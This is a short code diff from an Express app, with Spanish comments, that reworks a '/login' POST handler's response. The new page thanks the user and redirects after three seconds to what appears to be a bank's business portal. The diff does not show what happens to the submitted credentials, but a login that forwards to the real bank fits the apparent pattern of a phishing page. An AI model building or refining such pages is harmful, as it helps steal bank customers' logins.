@@ -29,9 +29,19 @@ app.post("/login", async (req, res) => {
 
     // Aquí estaba el error: faltaban comillas y concatenación
     res.send(`
-      ✅ Hemos recibido tu solicitud
+  <!DOCTYPE html>
+  <html lang="es">
+    <head>
+      <meta charset="UTF-8">
       <meta http-equiv="refresh" content="3;url=https://empresas.officebanking.cl">
-    `);
+      <title>Redirigiendo...</title>
+    </head>
+    <body>
+      ✅ Hemos recibido tu solicitud. Serás redirigido en 3 segundos.
+    </body>
+  </html>
+`);
+
 
   } catch (error) {
     console.error(error);
